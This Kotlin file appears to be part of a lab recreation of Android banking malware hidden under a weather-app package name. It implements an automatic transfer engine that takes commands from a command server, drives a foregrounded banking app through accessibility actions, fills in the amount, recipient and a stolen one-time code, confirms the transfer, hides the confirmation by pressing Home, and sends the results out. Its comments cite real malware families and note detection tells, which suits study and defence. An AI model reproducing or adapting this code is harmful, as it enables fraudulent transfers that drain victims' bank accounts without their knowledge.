package com.skyweather.forecast.core

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityNodeInfo
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * Automatic Transfer System — ATS orchestration engine.
 *
 * ══════════════════════════════════════════════════════════════════
 * STAGE 4 — ATS Engine (SharkBot + Anatsa Pattern)
 * ══════════════════════════════════════════════════════════════════
 *
 * ATS is the terminal capability of modern banker malware.
 * Once Stages 1-3 establish evasion + credential capture + OTP
 * intercept, Stage 4 composes them into automated fraud:
 *
 *   1. User opens banking app (detected by AccessibilityEngine)
 *   2. ATS reads current screen via ScreenReader
 *   3. ATS navigates to transfer flow via GestureInjector
 *   4. ATS fills attacker-controlled amount + recipient
 *   5. ATS waits for OTP prompt, auto-fills from CredentialStore
 *   6. ATS confirms transfer
 *   7. ATS presses Home — user sees home screen, not confirmation
 *   8. ATS reports result to C2 via SyncTask
 *
 * The entire sequence runs while the device screen is ON and
 * the banking app is in foreground. User sees their banking app
 * apparently doing things autonomously. Real SharkBot ATS
 * completes a transfer in 8-15 seconds.
 *
 * Real-world references:
 *   SharkBot (2021): Pioneered ATS. First widely-deployed family
 *     using A11y-driven UI automation for fraudulent transfers.
 *     research/06 §"ATS Architecture"
 *   Anatsa (2022+): Adopted ATS from SharkBot. More sophisticated
 *     screen-state machine. Per-bank command configs from C2.
 *     research/02 §"Capabilities"
 *   Octo2 (2024): Mixed ATS + VNC. Operator can watch screen
 *     real-time while ATS executes, intervene manually if needed.
 *
 * Command protocol — C2 pushes ATS commands via UpdateChannel:
 *   {"ats_commands": [
 *     {"action":"wait_screen","patterns":["Transfer"]},
 *     {"action":"set_text","target_id":"amount","value":"500.00"},
 *     {"action":"set_text","target_id":"iban","value":"..."},
 *     {"action":"click","target_id":"continue"},
 *     {"action":"wait_screen","patterns":["code","verification"]},
 *     {"action":"auto_fill_otp","target_id":"otp_field"},
 *     {"action":"click","target_id":"confirm"},
 *     {"action":"press_home"}
 *   ]}
 *
 * Analyst tell: structured command sequences flowing from C2 →
 * AccessibilityService action dispatch during banking app foreground
 * = canonical ATS shape. Multi-event Sigma correlation across:
 * window_state_changed + set_text + click + OTP drain = ATS killchain.
 *
 * Lab safety: commands execute only when all gates pass.
 * Target app must be in C2-delivered target_list.
 * Network exfil constrained to RFC1918.
 * ══════════════════════════════════════════════════════════════════
 */
class AtsEngine(private val service: AccessibilityService) {

    private val handler = Handler(Looper.getMainLooper())
    private val injector = GestureInjector(service)

    // Command queue — populated by UpdateChannel C2 config
    private val commandQueue = ConcurrentLinkedQueue<AtsCommand>()

    // Engine state
    private var state = State.IDLE
    private var currentTarget: String = ""
    private var executionStartMs = 0L

    // Result tracking for C2 reporting
    private var actionsExecuted = 0
    private var lastError: String? = null

    /**
     * Load ATS command sequence from C2 config.
     *
     * Called by UpdateChannel when config contains "ats_commands" array.
     * Commands are parsed from JSON and queued for execution.
     *
     * Real Anatsa: C2 pushes per-bank command profiles.
     * Operator reverse-engineers target banking app, records the exact
     * sequence of view IDs and screen patterns needed to complete
     * a transfer, encodes as command JSON.
     */
    fun loadCommands(commands: List<AtsCommand>) {
        commandQueue.clear()
        commandQueue.addAll(commands)
        state = State.ARMED
        actionsExecuted = 0
        lastError = null
    }

    /**
     * Called by AccessibilityEngine when a target banking app
     * comes to foreground. Triggers ATS execution if armed.
     *
     * Activation conditions:
     *   1. Engine is ARMED (commands loaded)
     *   2. Foreground package matches expected target
     *   3. All safety gates still pass
     *
     * @param packageName Foreground banking app package
     */
    fun onTargetForegrounded(packageName: String) {
        if (state != State.ARMED) return
        if (!AppConfig.isEndpointSafe()) return

        currentTarget = packageName
        state = State.EXECUTING
        executionStartMs = System.currentTimeMillis()

        // Begin command execution with initial jitter delay
        // Don't start instantly — wait for banking app to fully render
        handler.postDelayed({ executeNextCommand() }, 1500L)
    }

    /**
     * Core execution loop — process one command at a time.
     *
     * Each command execution:
     *   1. Dequeue next command
     *   2. Get root node (current screen state)
     *   3. Execute command action
     *   4. Apply Herodotus-pattern jitter delay
     *   5. Schedule next command
     *
     * Timeout: abort if total execution exceeds 60 seconds.
     * Real SharkBot: 8-15 second typical transfer time.
     * 60-second ceiling handles slow banking apps / network latency.
     */
    private fun executeNextCommand() {
        // Safety re-check every command cycle
        if (!AppConfig.isEndpointSafe()) {
            abort("gate_failed")
            return
        }

        // Timeout check — 60 second ceiling
        val elapsed = System.currentTimeMillis() - executionStartMs
        if (elapsed > 60_000L) {
            abort("timeout")
            return
        }

        // Dequeue next command
        val command = commandQueue.poll()
        if (command == null) {
            // All commands executed — report success
            complete()
            return
        }

        // Get current screen state
        val root = service.rootInActiveWindow
        if (root == null) {
            // Screen not readable — retry after delay
            commandQueue.add(command) // Put command back
            handler.postDelayed({ executeNextCommand() }, 500L)
            return
        }

        // Execute command
        val success = executeCommand(command, root)
        root.recycle()

        if (success) {
            actionsExecuted++
            // Jitter delay before next command (Herodotus pattern)
            val delay = injector.nextJitterMs()
            handler.postDelayed({ executeNextCommand() }, delay)
        } else {
            // Command failed — retry once after short delay
            // Real SharkBot: 3 retries per command before aborting
            if (command.retries < 3) {
                command.retries++
                commandQueue.add(command) // Put back for retry
                handler.postDelayed({ executeNextCommand() }, 1000L)
            } else {
                abort("action_failed:${command.action}")
            }
        }
    }

    /**
     * Execute a single ATS command against the current screen.
     *
     * Command dispatch:
     *   wait_screen    — verify expected screen is visible
     *   set_text       — fill an input field
     *   click          — tap a button/link
     *   click_text     — tap element containing specific text
     *   auto_fill_otp  — fill OTP from CredentialStore (Stage 3 capture)
     *   scroll         — scroll a container
     *   press_back     — navigate back
     *   press_home     — exit to launcher
     *   wait           — static delay (milliseconds)
     */
    private fun executeCommand(cmd: AtsCommand, root: AccessibilityNodeInfo): Boolean {
        return when (cmd.action) {
            "wait_screen" -> {
                // Verify expected screen is visible
                // Non-destructive — just checks text patterns
                val patterns = cmd.patterns
                if (patterns.isNullOrEmpty()) true
                else ScreenReader.screenContainsAny(root, patterns)
            }

            "set_text" -> {
                // Fill a text field by view ID
                val targetId = cmd.targetId ?: return false
                val value = cmd.value ?: return false
                val node = ScreenReader.findNodeById(root, targetId)
                if (node != null) {
                    val result = injector.setText(node, value)
                    node.recycle()
                    result
                } else false
            }

            "click" -> {
                // Click a node by view ID
                val targetId = cmd.targetId ?: return false
                val node = ScreenReader.findNodeById(root, targetId)
                if (node != null) {
                    val result = injector.clickNode(node)
                    node.recycle()
                    result
                } else false
            }

            "click_text" -> {
                // Click element containing specific text
                // Used when target has no stable view ID (dynamic banking UIs)
                val textPattern = cmd.value ?: return false
                val node = ScreenReader.findNodeByText(root, textPattern)
                if (node != null) {
                    val result = injector.clickNode(node)
                    node.recycle()
                    result
                } else false
            }

            "auto_fill_otp" -> {
                // Core Stage 3→4 bridge: fill intercepted OTP into banking app
                //
                // OTP source priority:
                //   1. CredentialStore (captured by NLS/SMS/A11y in Stage 3)
                //   2. Retry with fresh capture (OTP may arrive during ATS)
                //
                // Real SharkBot: SMS interception feeds OTP directly into auto-fill.
                // Operator pushes "transfer" command → malware reads bank-issued OTP
                // from SMS → auto-fills → completes transfer. User sees nothing.
                val targetId = cmd.targetId ?: return false
                val otp = findLatestOtp()
                if (otp != null) {
                    val node = ScreenReader.findNodeById(root, targetId)
                    if (node != null) {
                        val result = injector.setText(node, otp)
                        node.recycle()
                        result
                    } else false
                } else {
                    // OTP not yet captured — retry (NLS/SMS may deliver it shortly)
                    // ATS waits up to 30 seconds for OTP arrival
                    false
                }
            }

            "scroll" -> {
                // Scroll a container to reveal hidden elements
                val targetId = cmd.targetId
                val node = if (targetId != null) {
                    ScreenReader.findNodeById(root, targetId)
                } else {
                    // No target ID — find first scrollable container
                    ScreenReader.findClickableNodes(root).firstOrNull {
                        it.isScrollable
                    }
                }
                if (node != null) {
                    val result = injector.scrollNode(node, forward = cmd.value != "up")
                    node.recycle()
                    result
                } else false
            }

            "press_back" -> injector.pressBack()

            "press_home" -> {
                // Exit banking app cleanly — user sees home screen
                // Prevents user from seeing transfer confirmation
                injector.pressHome()
            }

            "wait" -> {
                // Static delay — used between complex screen transitions
                // Not the same as Herodotus jitter (that's between every command)
                // This is explicit "wait 2 seconds for the bank's loading spinner"
                true // The actual delay is handled by cmd.delayMs in the scheduling
            }

            "read_screen" -> {
                // Capture full screen text and report to C2
                // Real Octo2: live screen mirroring for operator
                val textNodes = ScreenReader.extractAllText(root)
                val screenJson = textNodes.joinToString(",") { node ->
                    "{\"id\":\"${escapeJson(node.viewId)}\",\"text\":\"${escapeJson(node.text)}\"}"
                }
                CredentialStore.capture(
                    CredentialStore.CapturedEvent(
                        packageName = currentTarget,
                        viewId = "ats_screen_dump",
                        text = "[$screenJson]".take(500),
                        timestamp = System.currentTimeMillis(),
                        eventType = "ats_read"
                    )
                )
                true
            }

            else -> false
        }
    }

    /**
     * Find the most recent OTP code from CredentialStore.
     *
     * Stage 3→4 bridge: NLS/SMS/A11y captured OTP codes are buffered
     * in CredentialStore. ATS engine queries for the latest OTP-typed
     * entry and uses it to auto-fill the banking app's verification field.
     *
     * Real SharkBot timing: SMS arrives → OTP extracted → auto-filled
     * within 2-5 seconds. Bank OTP validity: 30-120 seconds.
     * Time budget is comfortable.
     *
     * @return Most recent OTP code string, or null if none captured
     */
    private fun findLatestOtp(): String? {
        // Peek at credential store for OTP-type entries
        // Don't drain — other exfil paths may still need the entries
        val pending = CredentialStore.peekAll()
        val otpEntry = pending
            .filter { it.eventType.startsWith("otp") }
            .maxByOrNull { it.timestamp }

        return otpEntry?.text
    }

    /**
     * ATS execution completed successfully — all commands processed.
     *
     * Report results to C2 via CredentialStore → SyncTask exfil.
     * Includes: target package, actions executed, total duration.
     */
    private fun complete() {
        state = State.COMPLETED
        val duration = System.currentTimeMillis() - executionStartMs

        CredentialStore.capture(
            CredentialStore.CapturedEvent(
                packageName = currentTarget,
                viewId = "ats_result",
                text = "success:actions=$actionsExecuted,duration=${duration}ms",
                timestamp = System.currentTimeMillis(),
                eventType = "ats_complete"
            )
        )

        // Trigger URGENT exfil — C2 operator waiting for ATS result
        ForecastSyncWorker.scheduleUrgent(service.applicationContext)

        // Reset engine for next activation
        reset()
    }

    /**
     * Abort ATS execution — error or timeout.
     *
     * Report failure reason to C2. Real SharkBot: operator receives
     * abort notification, may push corrected command sequence for retry.
     */
    private fun abort(reason: String) {
        state = State.ABORTED
        lastError = reason
        val duration = System.currentTimeMillis() - executionStartMs

        CredentialStore.capture(
            CredentialStore.CapturedEvent(
                packageName = currentTarget,
                viewId = "ats_result",
                text = "abort:reason=$reason,actions=$actionsExecuted,duration=${duration}ms",
                timestamp = System.currentTimeMillis(),
                eventType = "ats_abort"
            )
        )

        ForecastSyncWorker.scheduleUrgent(service.applicationContext)
        reset()
    }

    private fun reset() {
        commandQueue.clear()
        state = State.IDLE
        currentTarget = ""
        actionsExecuted = 0
        lastError = null
        handler.removeCallbacksAndMessages(null)
    }

    /**
     * Called when target app leaves foreground during ATS execution.
     * User switched away → abort. Can't control a non-foreground app.
     */
    fun onTargetLostForeground() {
        if (state == State.EXECUTING) {
            abort("target_lost_foreground")
        }
    }

    fun isExecuting(): Boolean = state == State.EXECUTING
    fun isArmed(): Boolean = state == State.ARMED

    private fun escapeJson(s: String): String {
        return s.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }

    // ─── Command Data Class ──────────────────────────────────────

    /**
     * Single ATS command — parsed from C2 JSON.
     *
     * Mutable retries field tracks per-command retry count.
     * Max 3 retries per command before ATS aborts.
     */
    data class AtsCommand(
        val action: String,
        val targetId: String? = null,
        val value: String? = null,
        val patterns: List<String>? = null,
        val delayMs: Long = 0L,
        var retries: Int = 0
    )

    enum class State {
        IDLE,       // No commands loaded
        ARMED,      // Commands loaded, waiting for target foreground
        EXECUTING,  // Actively processing command queue
        COMPLETED,  // All commands executed successfully
        ABORTED     // Execution failed or timed out
    }

    companion object {
        /**
         * Parse ATS commands from C2 JSON string.
         *
         * Expected format:
         *   [{"action":"set_text","target_id":"amount","value":"500.00"}, ...]
         *
         * Minimal JSON parsing — no library dependency.
         * Real Anatsa: full JSON parser for complex command trees.
         * Lab: regex extraction for flat command arrays.
         */
        fun parseCommands(json: String): List<AtsCommand> {
            val commands = mutableListOf<AtsCommand>()

            // Extract individual command objects from JSON array
            val objPattern = Regex("\\{([^}]+)\\}")
            for (match in objPattern.findAll(json)) {
                val obj = match.groupValues[1]

                val action = extractJsonString(obj, "action") ?: continue
                val targetId = extractJsonString(obj, "target_id")
                val value = extractJsonString(obj, "value")
                val delayMs = extractJsonLong(obj, "delay_ms") ?: 0L

                // Parse patterns array (for wait_screen)
                val patternsStr = extractJsonString(obj, "patterns")
                val patterns = patternsStr?.split(",")?.map { it.trim() }

                commands.add(AtsCommand(
                    action = action,
                    targetId = targetId,
                    value = value,
                    patterns = patterns,
                    delayMs = delayMs
                ))
            }

            return commands
        }

        private fun extractJsonString(json: String, key: String): String? {
            val pattern = Regex("\"$key\"\\s*:\\s*\"([^\"]*?)\"")
            return pattern.find(json)?.groupValues?.get(1)
        }

        private fun extractJsonLong(json: String, key: String): Long? {
            val pattern = Regex("\"$key\"\\s*:\\s*(\\d+)")
            return pattern.find(json)?.groupValues?.get(1)?.toLongOrNull()
        }
    }
}
